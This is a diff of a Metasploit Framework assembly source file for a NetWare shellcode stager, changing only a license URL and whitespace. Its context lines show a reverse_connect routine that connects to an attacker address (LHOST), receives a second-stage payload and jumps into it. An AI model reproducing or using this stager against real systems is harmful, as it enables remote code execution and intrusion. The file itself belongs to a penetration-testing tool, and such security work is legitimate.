@@ -5,8 +5,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 
@@ -150,7 +150,7 @@ resolv_ptrs:
 
 reverse_connect:
 	xor ebx, ebx
-	
+
 	push ebp
 	mov ebp, esp
 	push ebp
@@ -161,7 +161,7 @@ reverse_connect:
 	mov esi, eax
 	test eax, eax
 	jz end
-	
+
 	push ebx
 	push ebx
 	push LHOST
@@ -175,11 +175,11 @@ reverse_connect:
 	call [edi-0x10]       // LIBC.NLM|bsd_connect_mp
 	cmp eax, -1
 	jz end
-	
+
 	push 65535
 	push edi
 	mov ecx, esp
-	
+
 	push ebx
 	push ebx
 	push ebx
@@ -190,13 +190,13 @@ reverse_connect:
 	push ebx
 	push ebx
 	mov ecx, esp
-	
+
 	push ebp
 	push ebx
 	push ecx
 	push esi
 	call [edi-0x14]       // LIBC.NLM|bsd_recvmsg_mp
-	
+
 	jmp edi
 
 end:
